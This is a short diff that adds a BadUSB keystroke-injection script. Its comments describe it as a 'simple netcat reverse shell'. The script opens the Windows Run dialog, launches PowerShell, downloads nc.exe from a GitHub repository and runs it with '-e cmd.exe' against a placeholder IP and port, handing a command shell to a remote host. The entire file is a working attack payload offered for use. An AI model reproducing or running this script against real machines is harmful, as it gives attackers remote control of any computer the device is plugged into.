@@ -1,0 +1,10 @@
+Rem:Simple netcat reverse shell that downloads the binary and executes it. Blocked by AV.
+Press:131+114
+CustomDelay:2000
+Rem:Needs a lot of whitespaces to avoid running any other cached Run command starting with powershell.exe
+PrintLine:powershell.exe                 
+CustomDelay:1000
+PrintLine:Invoke-WebRequest -Uri 'https://github.com/purpleracc00n/BadUSB_Scripts/raw/main/nc.exe' -outfile 'nc.exe'
+CustomDelay:1000
+PrintLine:./nc.exe <IP> <port> -e cmd.exe
+Delay
